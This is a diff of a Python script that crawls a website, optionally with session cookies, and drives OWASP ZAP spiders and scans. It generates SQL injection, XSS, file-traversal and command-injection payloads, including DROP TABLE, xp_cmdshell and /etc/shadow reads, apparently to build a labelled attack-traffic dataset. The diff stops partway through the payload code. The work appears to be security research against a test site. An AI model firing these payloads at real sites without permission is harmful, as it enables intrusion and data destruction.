@@ -1,35 +1,36 @@
 #!/usr/bin/env python3
 """
-PHASE 1: ZAP PROXY + ATTACK TOOLS - COMPLETE VERSION (FIXED URL ENCODING)
-==========================================================================
-✅ MỖI TOOL CHỈ ATTACK 1 LẦN (tránh duplicate)
-✅ ĐẢM BẢO TRAFFIC ĐI QUA ZAP PROXY
-✅ THU THẬP DATASET ĐẦY ĐỦ TỪ ATTACK TOOLS
-✅ VALIDATE PROXY CONNECTION TRƯỚC KHI ATTACK
-✅ ENHANCED DEBUGGING CHO TRAFFIC FLOW
-✅ FIX: Decode URL-encoded body before saving to CSV
+PHASE 1: COMPLETE WORKFLOW - CRAWL → ATTACK → EXPORT
+=====================================================
+✅ Step 1: Direct crawl với requests (hỗ trợ cookie authentication)
+✅ Step 2: Feed URLs vào ZAP proxy để capture
+✅ Step 3: Generate và gửi attack payloads qua ZAP
+✅ Step 4: Generate benign traffic
+✅ Step 5: Export to CSV
 
-Key Features:
-- Each tool runs ONCE per selected URL
-- Verify proxy is working before attacks
-- Better traffic capture validation
-- Improved error handling
-- Clear logging of captured payloads
-- FIXED: No double URL encoding issue
+PHƯƠNG PHÁP MỚI:
+- Crawl trực tiếp bằng requests (không phụ thuộc ZAP spider)
+- Hỗ trợ cookie để crawl authenticated pages
+- Hoạt động với BẤT KỲ domain nào trên internet
+- ZAP chỉ dùng để capture traffic và log
+
+Compatible với run_pipeline.sh
+Output: /output/phase1_baseline.csv
 """
 import os
 import csv
 import time
-import subprocess
-import urllib.parse
+import random
 import requests
+import urllib.parse
 import hashlib
-import shutil
+import re
 from datetime import datetime
 import sys
 import warnings
+from html.parser import HTMLParser
+from collections import deque
 
-# Tắt SSL warnings
 warnings.filterwarnings('ignore', message='Unverified HTTPS request')
 try:
     import urllib3
@@ -44,34 +45,80 @@ except ImportError:
     sys.exit(1)
 
 # ====================== CONFIG ======================
-TARGET = os.getenv('TARGET_URL', 'http://testaspnet.vulnweb.com')
+# TARGET_URL có thể là full URL (https://example.com) hoặc domain (example.com)
+RAW_TARGET = os.getenv('TARGET_URL', 'http://testaspnet.vulnweb.com')
+
+# Normalize target URL - đảm bảo có scheme
+if RAW_TARGET.startswith('http://') or RAW_TARGET.startswith('https://'):
+    TARGET = RAW_TARGET
+else:
+    # Nếu chỉ có domain, thêm http:// mặc định
+    TARGET = f"http://{RAW_TARGET}"
+
+# Optional cookie cho authenticated crawling (có thể đăng nhập trước)
+# Format: "session=abc123; auth_token=xyz789" hoặc để trống
+COOKIE = os.getenv('COOKIE', '')
+
 ZAP_HOST = os.getenv('ZAP_HOST', 'zap')
 ZAP_PORT = os.getenv('ZAP_PORT', '8080')
 PROXY = f"http://{ZAP_HOST}:{ZAP_PORT}"
 
+# Crawl settings
+MAX_CRAWL_DEPTH = int(os.getenv('MAX_CRAWL_DEPTH', '3'))
+MAX_URLS_TO_CRAWL = int(os.getenv('MAX_URLS_TO_CRAWL', '100'))
+CRAWL_TIMEOUT = int(os.getenv('CRAWL_TIMEOUT', '10'))
+
 OUTPUT_DIR = os.getenv('OUTPUT_DIR', '/output')
-FINAL_CSV = os.path.join(OUTPUT_DIR, "phase1_baseline.csv")
+FINAL_CSV = os.getenv('PHASE1_CSV', os.path.join(OUTPUT_DIR, "phase1_baseline.csv"))
 URL_FILE = os.path.join(OUTPUT_DIR, "crawled_urls.txt")
 PARAM_URL_FILE = os.path.join(OUTPUT_DIR, "param_urls.txt")
 
 MAX_URLS_AJAX = int(os.getenv('MAX_URLS_AJAX', '8'))
 MAX_URLS_ATTACK = int(os.getenv('MAX_URLS_ATTACK', '5'))
-ATTACK_TIMEOUT = int(os.getenv('ATTACK_TIMEOUT', '90'))
 
-# Global state
-seen_signatures = set()
-total_exported = 0
-attack_stats = {}
+# Stats
+stats = {
+    'spider_urls': 0,
+    'ajax_urls': 0,
+    'param_urls': 0,
+    'SQLI': 0,
+    'XSS': 0,
+    'LFI': 0,
+    'RCE': 0,
+    'XXE': 0,
+    'BENIGN': 0,
+    'exported': 0
+}
+
+# Session cho direct requests (KHÔNG qua proxy - để crawl)
+direct_session = requests.Session()
+direct_session.headers.update({
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+    "Accept-Language": "en-US,en;q=0.5",
+    "Connection": "keep-alive"
+})
+
+# Session cho requests qua ZAP proxy (để capture traffic)
+session = requests.Session()
+session.headers.update({
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+    "Connection": "keep-alive"
+})
+
+# Thêm cookie nếu được cung cấp (để crawl authenticated pages)
+if COOKIE:
+    direct_session.headers.update({"Cookie": COOKIE})
+    session.headers.update({"Cookie": COOKIE})
 
 # ====================== UTILS ======================
 def log(msg, level="INFO"):
-    """Logging với màu sắc"""
+    """Logging"""
     colors = {
         "INFO": "\033[94m",
-        "OK": "\033[92m", 
+        "OK": "\033[92m",
         "WARNING": "\033[93m",
-        "ERROR": "\033[91m",
-        "DEBUG": "\033[95m"
+        "ERROR": "\033[91m"
     }
     reset = "\033[0m"
     color = colors.get(level, "")
@@ -79,57 +126,17 @@ def log(msg, level="INFO"):
     print(f"{color}[{timestamp}] [{level}] {msg}{reset}", flush=True)
 
 def clean_multiline(text):
-    """Clean text cho CSV - bảo toàn payload"""
+    """Clean text cho CSV"""
     if not text:
         return ""
     return str(text).replace("\n", " ").replace("\r", "").strip()
 
-def decode_body_if_needed(body):
-    """
-    ✅ CRITICAL FIX: Decode URL-encoded body before saving
-    ZAP may return URL-encoded body, we need to decode it
-    to avoid double-encoding in Phase 2
-    """
-    if not body or not isinstance(body, str):
-        return body
-    
-    # Check if body contains URL encoding (has %)
-    if '%' in body:
-        try:
-            # Try to decode
-            decoded = urllib.parse.unquote_plus(body)
-            
-            # Only use decoded if it actually changed something
-            # and doesn't start with % (indicating it was encoded)
-            if decoded != body and not decoded.startswith('%'):
-                # log(f"  [DECODE] Body decoded: {len(body)} → {len(decoded)} bytes", "DEBUG")
-                return decoded
-        except Exception as e:
-            # If decode fails, keep original
-            pass
-    
-    return body
-
 def has_param(url):
-    """Kiểm tra URL có parameter"""
+    """Check if URL has parameters"""
     return urllib.parse.urlparse(url).query != ""
 
-def get_sig(req_body, url, tech):
-    """
-    Tạo signature để deduplicate
-    ✅ Attack traffic: KHÔNG deduplicate
-    ✅ Benign traffic: Deduplicate bình thường
-    """
-    if tech in ["SQLI", "XSS", "RCE", "DIR", "COMMIX", "FFUF"]:
-        import random
-        return hashlib.md5(f"{tech}|{time.time()}|{random.random()}".encode()).hexdigest()
-    
-    payload = (req_body or "").lower()
-    path = urllib.parse.urlparse(url).path.lower()
-    return hashlib.md5(f"{tech}|{payload[:100]}|{path}".encode()).hexdigest()
-
 def url_priority(url):
-    """Tính priority của URL cho attack"""
+    """Calculate URL priority for attack"""
     score = 0
     path = urllib.parse.urlparse(url).path.lower()
     
@@ -142,9 +149,199 @@ def url_priority(url):
     
     return score
 
+# ====================== DIRECT CRAWLER (KHÔNG PHỤ THUỘC ZAP) ======================
+class LinkExtractor(HTMLParser):
+    """Extract links from HTML"""
+    def __init__(self, base_url):
+        super().__init__()
+        self.base_url = base_url
+        self.base_domain = urllib.parse.urlparse(base_url).netloc
+        self.links = set()
+        self.forms = []
+        self.current_form = None
+    
+    def handle_starttag(self, tag, attrs):
+        attrs_dict = dict(attrs)
+        
+        # Extract links
+        if tag == 'a' and 'href' in attrs_dict:
+            self._add_link(attrs_dict['href'])
+        elif tag == 'form':
+            action = attrs_dict.get('action', '')
+            method = attrs_dict.get('method', 'get').upper()
+            self.current_form = {'action': action, 'method': method, 'inputs': []}
+        elif tag == 'input' and self.current_form is not None:
+            input_type = attrs_dict.get('type', 'text')
+            input_name = attrs_dict.get('name', '')
+            if input_name and input_type not in ['submit', 'button', 'image', 'reset']:
+                self.current_form['inputs'].append({
+                    'name': input_name,
+                    'type': input_type,
+                    'value': attrs_dict.get('value', '')
+                })
+        elif tag in ['script', 'link', 'img', 'iframe'] and 'src' in attrs_dict:
+            self._add_link(attrs_dict['src'])
+        elif tag == 'link' and 'href' in attrs_dict:
+            self._add_link(attrs_dict['href'])
+    
+    def handle_endtag(self, tag):
+        if tag == 'form' and self.current_form is not None:
+            if self.current_form['inputs']:
+                self.forms.append(self.current_form)
+            self.current_form = None
+    
+    def _add_link(self, href):
+        if not href or href.startswith(('#', 'javascript:', 'mailto:', 'tel:', 'data:')):
+            return
+        
+        try:
+            # Normalize URL
+            if href.startswith('//'):
+                href = 'https:' + href
+            elif href.startswith('/'):
+                parsed_base = urllib.parse.urlparse(self.base_url)
+                href = f"{parsed_base.scheme}://{parsed_base.netloc}{href}"
+            elif not href.startswith('http'):
+                href = urllib.parse.urljoin(self.base_url, href)
+            
+            # Check same domain
+            parsed = urllib.parse.urlparse(href)
+            if parsed.netloc == self.base_domain:
+                # Remove fragment
+                clean_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
+                if parsed.query:
+                    clean_url += f"?{parsed.query}"
+                self.links.add(clean_url)
+        except:
+            pass
+
+def direct_crawl():
+    """
+    STEP 1: Direct crawl bằng requests (KHÔNG phụ thuộc ZAP spider)
+    Hoạt động với BẤT KỲ domain nào trên internet
+    """
+    log("="*80)
+    log("STEP 1: DIRECT CRAWL (Independent)", "OK")
+    log("="*80)
+    log(f"  Target: {TARGET}")
+    log(f"  Max depth: {MAX_CRAWL_DEPTH}")
+    log(f"  Max URLs: {MAX_URLS_TO_CRAWL}")
+    if COOKIE:
+        log(f"  🍪 Cookie: Enabled (authenticated mode)", "OK")
+    
+    discovered_urls = set()
+    discovered_forms = []
+    visited = set()
+    queue = deque([(TARGET, 0)])  # (url, depth)
+    
+    domain = urllib.parse.urlparse(TARGET).netloc
+    
+    while queue and len(discovered_urls) < MAX_URLS_TO_CRAWL:
+        url, depth = queue.popleft()
+        
+        if url in visited or depth > MAX_CRAWL_DEPTH:
+            continue
+        
+        visited.add(url)
+        
+        try:
+            log(f"  [{len(discovered_urls):3d}] Crawling: {url[:60]}...")
+            
+            resp = direct_session.get(url, timeout=CRAWL_TIMEOUT, verify=False, 
+                                       allow_redirects=True)
+            
+            if resp.status_code == 200:
+                discovered_urls.add(url)
+                
+                # Parse HTML
+                content_type = resp.headers.get('Content-Type', '')
+                if 'text/html' in content_type:
+                    try:
+                        parser = LinkExtractor(url)
+                        parser.feed(resp.text)
+                        
+                        # Add discovered links to queue
+                        for link in parser.links:
+                            if link not in visited and domain in link:
+                                queue.append((link, depth + 1))
+                                discovered_urls.add(link)
+                        
+                        # Collect forms
+                        for form in parser.forms:
+                            form['page_url'] = url
+                            discovered_forms.append(form)
+                    except:
+                        pass
+            
+            time.sleep(0.2)  # Rate limiting
+            
+        except requests.exceptions.Timeout:
+            log(f"  Timeout: {url[:50]}...", "WARNING")
+        except Exception as e:
+            pass
+    
+    # Add common paths if we found few URLs
+    if len(discovered_urls) < 10:
+        log("  Adding common paths...", "INFO")
+        common_paths = [
+            '/', '/login', '/admin', '/search', '/contact', '/about',
+            '/register', '/signup', '/api', '/user', '/account',
+            '/products', '/services', '/blog', '/news', '/help'
+        ]
+        scheme = 'https' if TARGET.startswith('https') else 'http'
+        for path in common_paths:
+            discovered_urls.add(f"{scheme}://{domain}{path}")
+    
+    # Separate URLs with parameters
+    param_urls = [u for u in discovered_urls if has_param(u)]
+    
+    stats['spider_urls'] = len(discovered_urls)
+    stats['param_urls'] = len(param_urls)
+    
+    log(f"\n  ✅ Direct crawl complete!", "OK")
+    log(f"     Total URLs: {len(discovered_urls)}")
+    log(f"     With params: {len(param_urls)}")
+    log(f"     Forms found: {len(discovered_forms)}")
+    
+    # Save URLs
+    with open(URL_FILE, "w") as f:
+        for u in discovered_urls:
+            f.write(u + "\n")
+    
+    if param_urls:
+        with open(PARAM_URL_FILE, "w") as f:
+            for u in param_urls:
+                f.write(u + "\n")
+    
+    return list(discovered_urls), param_urls, discovered_forms
+
 # ====================== ZAP CONNECTION ======================
+def retry_zap_call(func, max_retries=3, delay=2):
+    """Retry wrapper for ZAP API calls with exponential backoff"""
+    for attempt in range(max_retries):
+        try:
+            return func()
+        except requests.exceptions.ProxyError as e:
+            if "Connection refused" in str(e) or "Failed to establish" in str(e):
+                if attempt < max_retries - 1:
+                    wait_time = delay * (2 ** attempt)  # Exponential backoff
+                    log(f"ZAP connection lost, retrying in {wait_time}s... ({attempt+1}/{max_retries})", "WARNING")
+                    time.sleep(wait_time)
+                else:
+                    log(f"ZAP connection failed after {max_retries} attempts", "ERROR")
+                    raise
+            else:
+                raise
+        except Exception as e:
+            if attempt < max_retries - 1:
+                log(f"ZAP API error, retrying... ({attempt+1}/{max_retries}): {e}", "WARNING")
+                time.sleep(delay)
+            else:
+                raise
+    return None
+
 def get_zap():
-    """Kết nối ZAP API"""
+    """Connect to ZAP"""
     log(f"Connecting to ZAP at {PROXY}...")
     
     for attempt in range(1, 41):
@@ -165,52 +362,830 @@ def get_zap():
     log("❌ Cannot connect to ZAP!", "ERROR")
     sys.exit(1)
 
-def verify_proxy_working():
+def setup_zap_authentication(zap):
     """
-    ✅ CRITICAL: Verify ZAP proxy is capturing traffic
+    Cấu hình ZAP để sử dụng cookie authentication
+    Điều này cho phép ZAP spider crawl các trang sau khi đăng nhập
     """
-    log("\n" + "="*80, "INFO")
-    log("VERIFYING ZAP PROXY CONNECTION", "OK")
-    log("="*80, "INFO")
+    if not COOKIE:
+        log("No cookie provided, using anonymous mode", "INFO")
+        return None
     
-    test_url = f"{TARGET}/test-proxy-{int(time.time())}"
+    log("="*80)
+    log("🍪 SETTING UP ZAP AUTHENTICATION", "OK")
+    log("="*80)
     
     try:
-        # Test request through proxy
-        response = requests.get(
-            test_url,
-            proxies={'http': PROXY, 'https': PROXY},
-            verify=False,
-            timeout=10
-        )
+        domain = urllib.parse.urlparse(TARGET).netloc
+        context_name = f"auth_{domain}"
         
-        log(f"  ✓ Proxy request sent: {test_url}", "OK")
+        # 1. Tạo context mới
+        log(f"  Creating context: {context_name}")
+        try:
+            # Xóa context cũ nếu có
+            contexts = zap.context.context_list
+            if context_name in str(contexts):
+                zap.context.remove_context(context_name)
+        except:
+            pass
         
-        # Verify ZAP captured it
-        time.sleep(2)
-        zap = get_zap()
-        msgs = zap.core.messages(start=0, count=10)
+        context_id = zap.context.new_context(context_name)
+        log(f"  Context ID: {context_id}")
         
-        captured = False
-        for msg in msgs:
-            if test_url in str(msg.get('requestHeader', '')):
-                captured = True
-                break
+        # 2. Include target URL trong context
+        escaped_domain = domain.replace('.', '\\.')
+        include_regex = f".*{escaped_domain}.*"
+        zap.context.include_in_context(context_name, include_regex)
+        log(f"  Included regex: {include_regex}")
         
-        if captured:
-            log("  ✅ ZAP PROXY IS CAPTURING TRAFFIC!", "OK")
-            return True
-        else:
-            log("  ⚠️  ZAP not capturing - check proxy settings", "WARNING")
-            return False
+        # 3. Tạo HTTP session với cookie
+        log(f"  Setting up HTTP session with cookie...")
+        
+        # Parse cookies
+        cookies = {}
+        for part in COOKIE.split(';'):
+            part = part.strip()
+            if '=' in part:
+                key, value = part.split('=', 1)
+                cookies[key.strip()] = value.strip()
+        
+        # Tạo session site
+        site = f"{urllib.parse.urlparse(TARGET).scheme}://{domain}"
+        
+        try:
+            # Thêm session tokens (các cookie names cần track)
+            for cookie_name in cookies.keys():
+                try:
+                    zap.httpsessions.add_session_token(site, cookie_name)
+                    log(f"    Added session token: {cookie_name}")
+                except:
+                    pass
             
+            # Tạo session mới
+            session_name = "authenticated_session"
+            try:
+                zap.httpsessions.create_empty_session(site, session_name)
+                log(f"  Created session: {session_name}")
+            except:
+                pass
+            
+            # Set session values
+            for cookie_name, cookie_value in cookies.items():
+                try:
+                    zap.httpsessions.set_session_token_value(
+                        site, session_name, cookie_name, cookie_value
+                    )
+                    log(f"    Set {cookie_name}={cookie_value[:20]}...")
+                except Exception as e:
+                    log(f"    Warning setting {cookie_name}: {e}", "WARNING")
+            
+            # Set active session
+            try:
+                zap.httpsessions.set_active_session(site, session_name)
+                log(f"  ✓ Activated session: {session_name}", "OK")
+            except:
+                pass
+                
+        except Exception as e:
+            log(f"  HTTP Session setup warning: {e}", "WARNING")
+        
+        # 4. Thêm cookie vào replacer rules (backup method)
+        log(f"  Setting up cookie header replacer...")
+        try:
+            # Xóa rule cũ nếu có
+            try:
+                zap.replacer.remove_rule("AuthCookie")
+            except:
+                pass
+            
+            # Thêm rule mới để inject cookie header
+            zap.replacer.add_rule(
+                description="AuthCookie",
+                enabled=True,
+                matchtype="REQ_HEADER",
+                matchregex=False,
+                matchstring="Cookie",
+                replacement=COOKIE,
+                initiators=""
+            )
+            log(f"  ✓ Cookie replacer rule added", "OK")
+        except Exception as e:
+            log(f"  Replacer warning: {e}", "WARNING")
+        
+        # 5. Truy cập target để thiết lập session trong ZAP
+        log(f"  Accessing target with cookie...")
+        try:
+            # Gửi request với cookie qua ZAP proxy
+            headers = {
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+                "Cookie": COOKIE
+            }
+            resp = requests.get(TARGET, headers=headers, 
+                               proxies={'http': PROXY, 'https': PROXY},
+                               verify=False, timeout=30)
+            log(f"  ✓ Target accessed: HTTP {resp.status_code}", "OK")
+        except Exception as e:
+            log(f"  Target access warning: {e}", "WARNING")
+        
+        log(f"\n  ✅ ZAP Authentication configured!", "OK")
+        log(f"     Context: {context_name}")
+        log(f"     Cookies: {len(cookies)} values set")
+        
+        return context_name
+        
     except Exception as e:
-        log(f"  ✗ Proxy verification failed: {e}", "ERROR")
-        return False
+        log(f"Authentication setup error: {e}", "ERROR")
+        import traceback
+        traceback.print_exc()
+        return None
+
+# ====================== FEED URLs TO ZAP ======================
+def feed_urls_to_zap(urls):
+    """Feed discovered URLs to ZAP proxy để capture traffic"""
+    log("\n" + "="*80)
+    log("STEP 2: FEED URLs TO ZAP", "OK")
+    log("="*80)
+    log(f"  Sending {len(urls)} URLs through ZAP proxy...")
+    
+    success = 0
+    for i, url in enumerate(urls[:50], 1):  # Limit to 50 URLs
+        try:
+            session.get(url, proxies={'http': PROXY, 'https': PROXY},
+                       verify=False, timeout=10)
+            success += 1
+        except:
+            pass
+        
+        if i % 10 == 0:
+            log(f"  Progress: {i}/{min(len(urls), 50)}")
+        
+        time.sleep(0.1)
+    
+    log(f"  ✅ Fed {success} URLs to ZAP", "OK")
+    return success
+
+# ====================== LEGACY SPIDER (FALLBACK) ======================
+def spider_crawl(zap, context_name=None):
+    """STEP 1: Spider Crawl to discover URLs với context authentication"""
+    log("="*80)
+    log("STEP 1: ZAP SPIDER CRAWL", "OK")
+    log("="*80)
+    
+    if context_name:
+        log(f"  Using authenticated context: {context_name}", "OK")
+
+    try:
+        # Bước 1: Truy cập URL trước để ZAP có thể xử lý (quan trọng với HTTPS)
+        log(f"  Accessing target URL first: {TARGET}")
+        try:
+            # Gửi request với cookie qua ZAP proxy
+            headers = {"Cookie": COOKIE} if COOKIE else {}
+            headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+            
+            resp = requests.get(TARGET, headers=headers,
+                               proxies={'http': PROXY, 'https': PROXY},
+                               verify=False, timeout=30)
+            log(f"  ✓ Target accessed: HTTP {resp.status_code}", "OK")
+            time.sleep(2)
+        except Exception as e:
+            log(f"  Target access warning: {e}", "WARNING")
+            try:
+                zap.urlopen(TARGET)
+                time.sleep(2)
+            except:
+                pass
+        
+        # Bước 2: Bắt đầu spider với context (nếu có)
+        if context_name:
+            log(f"  Starting spider with context: {context_name}")
+            scan_id = zap.spider.scan(url=TARGET, contextname=context_name)
+        else:
+            scan_id = zap.spider.scan(url=TARGET)
+        
+        log(f"  Spider scan started: {scan_id}")
+        
+        for _ in range(30):  # Tăng thời gian chờ
+            status = zap.spider.status(scan_id)
+            log(f"  Spider progress: {status}%")
+            if int(status) >= 100: 
+                break
+            time.sleep(5)
+        
+        zap.spider.stop(scan_id)
+        time.sleep(3)
+
+        urls = zap.core.urls()
+        domain = urllib.parse.urlparse(TARGET).netloc
+        domain_urls = [u for u in urls if domain in u]
+        
+        # Fallback: Nếu spider không tìm được URL, thử manual crawl
+        if not domain_urls:
+            log("Spider found no URLs, trying manual discovery...", "WARNING")
+            domain_urls = manual_url_discovery(zap, domain)
+        
+        stats['spider_urls'] = len(domain_urls)
+        log(f"✅ Spider found {len(domain_urls)} URLs", "OK")
+        
+        # Save URLs
+        with open(URL_FILE, "w") as f:
+            for u in domain_urls: 
+                f.write(u + "\n")
+        
+        return domain_urls
+        
+    except Exception as e:
+        log(f"Spider error: {e}", "ERROR")
+        return []
+
+def manual_url_discovery(zap, domain):
+    """Fallback: Manual URL discovery khi spider thất bại"""
+    log("  Performing manual URL discovery...", "INFO")
+    discovered_urls = set()
+    
+    # Thử truy cập target trực tiếp
+    try:
+        resp = session.get(TARGET, proxies={'http': PROXY, 'https': PROXY}, 
+                          verify=False, timeout=30)
+        discovered_urls.add(TARGET)
+        
+        # Parse HTML để tìm links
+        from html.parser import HTMLParser
+        
+        class LinkParser(HTMLParser):
+            def __init__(self):
+                super().__init__()
+                self.links = []
+            
+            def handle_starttag(self, tag, attrs):
+                if tag in ['a', 'form', 'iframe', 'script', 'link']:
+                    for attr, value in attrs:
+                        if attr in ['href', 'src', 'action'] and value:
+                            self.links.append(value)
+        
+        parser = LinkParser()
+        parser.feed(resp.text)
+        
+        # Normalize URLs
+        for link in parser.links:
+            try:
+                if link.startswith('http'):
+                    if domain in link:
+                        discovered_urls.add(link.split('#')[0].split('?')[0])
+                elif link.startswith('/'):
+                    # Absolute path
+                    scheme = 'https' if TARGET.startswith('https') else 'http'
+                    full_url = f"{scheme}://{domain}{link}"
+                    discovered_urls.add(full_url.split('#')[0])
+                elif not link.startswith(('javascript:', 'mailto:', '#', 'data:')):
+                    # Relative path
+                    base = TARGET.rstrip('/')
+                    full_url = f"{base}/{link}"
+                    discovered_urls.add(full_url.split('#')[0])
+            except:
+                pass
+        
+        log(f"  ✓ Found {len(discovered_urls)} URLs via manual crawl", "OK")
+        
+        # Truy cập các URL tìm được qua proxy để ZAP capture
+        for url in list(discovered_urls)[:20]:  # Giới hạn 20 URLs
+            try:
+                session.get(url, proxies={'http': PROXY, 'https': PROXY}, 
+                           verify=False, timeout=10)
+                time.sleep(0.2)
+            except:
+                pass
+        
+        # Lấy lại URLs từ ZAP
+        time.sleep(2)
+        zap_urls = zap.core.urls()
+        for u in zap_urls:
+            if domain in u:
+                discovered_urls.add(u)
+        
+    except Exception as e:
+        log(f"  Manual discovery error: {e}", "WARNING")
+    
+    return list(discovered_urls)
+
+# ====================== AJAX SPIDER PHASE ======================
+def ajax_crawl(zap, urls):
+    """STEP 2: AJAX Spider for dynamic content"""
+    log("\n" + "="*80)
+    log(f"STEP 2: AJAX SPIDER ({MAX_URLS_AJAX} URLs)", "OK")
+    log("="*80)
+
+    if not urls:
+        log("No URLs from spider, skipping AJAX", "WARNING")
+        return urls
+
+    # Select top URLs for AJAX spider (reduced to prevent ZAP overload)
+    max_ajax = min(MAX_URLS_AJAX, 5)  # Limit to 5 to prevent ZAP crash
+    sorted_urls = sorted(urls, key=url_priority, reverse=True)[:max_ajax]
+    
+    ajax_success = 0
+    for i, url in enumerate(sorted_urls, 1):
+        log(f"  AJAX [{i}/{len(sorted_urls)}] → {url[:70]}...")
+        
+        try:
+            def start_ajax():
+                return zap.ajaxSpider.scan(url=url, inscope=True)
+            
+            retry_zap_call(start_ajax, max_retries=2, delay=3)
+            
+            # Wait for AJAX spider with timeout
+            max_wait = 20  # Reduced from 25s
+            for wait in range(max_wait):
+                time.sleep(1)
+                try:
+                    status = retry_zap_call(lambda: zap.ajaxSpider.status, max_retries=2, delay=1)
+                    if status == "stopped":
+                        break
+                except:
+                    log(f"  Cannot check AJAX status, assuming complete", "WARNING")
+                    break
+            
+            try:
+                retry_zap_call(lambda: zap.ajaxSpider.stop(), max_retries=1, delay=1)
+            except:
+                pass
+            
+            ajax_success += 1
+            time.sleep(2)
+            
+        except Exception as e:
+            log(f"  AJAX error on URL {i}, continuing with next: {str(e)[:100]}", "WARNING")
+            # Continue with next URL even if this one fails
+            continue
+
+    log(f"  ✓ AJAX processed {ajax_success}/{len(sorted_urls)} URLs", "OK")
+    
+    # Get final URLs with retry
+    try:
+        final_urls = retry_zap_call(lambda: zap.core.urls(), max_retries=3, delay=5)
+        domain = urllib.parse.urlparse(TARGET).netloc
+        final_domain_urls = [u for u in final_urls if domain in u]
+    except Exception as e:
+        log(f"Cannot retrieve final URLs from ZAP, using original URLs: {e}", "WARNING")
+        final_domain_urls = urls
+    
+    stats['ajax_urls'] = len(final_domain_urls)
+    log(f"✅ AJAX complete: {len(final_domain_urls)} URLs total", "OK")
+    
+    return final_domain_urls
+
+# ====================== QUICK SCAN PHASE ======================
+def quick_scan(zap, urls):
+    """STEP 3: Quick scan to discover forms/parameters"""
+    log("\n" + "="*80)
+    log("STEP 3: QUICK SCAN (Discover Forms)", "OK")
+    log("="*80)
+
+    if not urls:
+        log("No URLs, skipping scan", "WARNING")
+        return [], urls
+
+    # Scan form pages
+    form_urls = [u for u in urls if any(k in u.lower() for k in ["login", "search", "contact", "comment"])][:3]
+    
+    if form_urls:
+        for url in form_urls:
+            try:
+                log(f"  Scanning: {url[:70]}...")
+                scan_id = retry_zap_call(lambda: zap.ascan.scan(url=url, recurse=False, scanpolicyname="Light"), max_retries=2, delay=3)
+                time.sleep(10)
+                retry_zap_call(lambda: zap.ascan.stop(scan_id), max_retries=1, delay=1)
+            except Exception as e:
+                log(f"  Scan failed, skipping: {str(e)[:50]}", "WARNING")
+                pass
+
+    time.sleep(5)
+    
+    # Get all URLs including discovered ones
+    try:
+        all_urls = retry_zap_call(lambda: zap.core.urls(), max_retries=3, delay=5)
+        domain = urllib.parse.urlparse(TARGET).netloc
+        domain_urls = [u for u in all_urls if domain in u]
+        param_urls = [u for u in domain_urls if has_param(u)]
+    except Exception as e:
+        log(f"Cannot retrieve URLs from ZAP, using original list: {e}", "WARNING")
+        domain_urls = urls
+        param_urls = [u for u in urls if has_param(u)]
+
+    stats['param_urls'] = len(param_urls)
+    
+    # Save param URLs
+    with open(PARAM_URL_FILE, "w") as f:
+        for u in param_urls: 
+            f.write(u + "\n")
+
+    log(f"✅ Scan complete: {len(param_urls)} parameter URLs found", "OK")
+    
+    return param_urls, domain_urls
+
+# ====================== PAYLOAD GENERATORS ======================
+class PayloadGenerator:
+    """Generate attack payloads"""
+    
+    @staticmethod
+    def generate_sqli_payloads(count=250):
+        """Generate SQL injection payloads"""
+        payloads = []
+        
+        # Boolean-based blind
+        for i in range(50):
+            val = random.randint(1000, 9999)
+            payloads.extend([
+                f"' AND {val}={val}--",
+                f"' OR {val}={val}--",
+                f"') AND {val}={val}--",
+                f"')) AND {val}={val}--",
+                f"' AND '{random.choice(['a','b','x'])}'='{random.choice(['a','b','x'])}",
+            ])
+        
+        # Union-based
+        for i in range(30):
+            payloads.extend([
+                f"' UNION SELECT NULL,NULL,{random.randint(1,100)}--",
+                f"' UNION ALL SELECT 1,2,3,4,5--",
+                f"1' UNION SELECT table_name FROM information_schema.tables--",
+                f"' UNION SELECT @@version,NULL,NULL--",
+            ])
+        
+        # Time-based blind
+        for i in range(20):
+            delay = random.randint(3, 8)
+            payloads.extend([
+                f"'; WAITFOR DELAY '00:00:{delay:02d}'--",
+                f"' OR SLEEP({delay})--",
+                f"'; SELECT pg_sleep({delay})--",
+            ])
+        
+        # Error-based
+        payloads.extend([
+            "' AND 1=CONVERT(int, (SELECT @@version))--",
+            "' AND extractvalue(1,concat(0x7e,version()))--",
+        ])
+        
+        # Stacked queries
+        for i in range(10):
+            payloads.extend([
+                f"'; DROP TABLE users_{i}--",
+                "'; EXEC xp_cmdshell('dir')--",
+            ])
+        
+        return payloads[:count]
+    
+    @staticmethod
+    def generate_xss_payloads(count=250):
+        """Generate XSS payloads"""
+        payloads = []
+        
+        # Basic XSS
+        events = ['onerror', 'onload', 'onclick', 'onmouseover', 'onfocus']
+        for i in range(40):
+            event = random.choice(events)
+            payloads.extend([
+                f"<script>alert({i})</script>",
+                f"<img src=x {event}=alert({i})>",
+                f"<svg {event}=alert({i})>",
+                f"<iframe src=javascript:alert({i})>",
+                f"<body {event}=alert({i})>",
+            ])
+        
+        # Encoded XSS
+        payloads.extend([
+            "<script>alert(String.fromCharCode(88,83,83))</script>",
+            "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>",
+        ])
+        
+        # Filter bypass
+        payloads.extend([
+            "<scr<script>ipt>alert(1)</scr</script>ipt>",
+            "<svg/onload=alert(1)>",
+            "<<SCRIPT>alert(1);//<</SCRIPT>",
+        ])
+        
+        return payloads[:count]
+    
+    @staticmethod
+    def generate_lfi_payloads(count=200):
+        """Generate LFI payloads"""
+        payloads = []
+        
+        files = ['/etc/passwd', '/etc/shadow', 'C:\\boot.ini']
+        
+        for file in files:
+            for depth in range(1, 8):
+                traversal = '../' * depth
+                payloads.append(traversal + file)
+        
+        payloads.extend([
+            '....//....//....//etc/passwd',
+            '..%2f..%2f..%2fetc%2fpasswd',
+        ])
+        
+        return payloads[:count]
+    
+    @staticmethod
+    def generate_rce_payloads(count=150):
+        """Generate RCE payloads"""
+        payloads = []
+        
+        commands = ['id', 'whoami', 'pwd']
+        
+        for cmd in commands:
+            payloads.extend([
+                f"; {cmd}",
+                f"| {cmd}",
+                f"&& {cmd}",
+                f"$({cmd})",
+            ])
+        
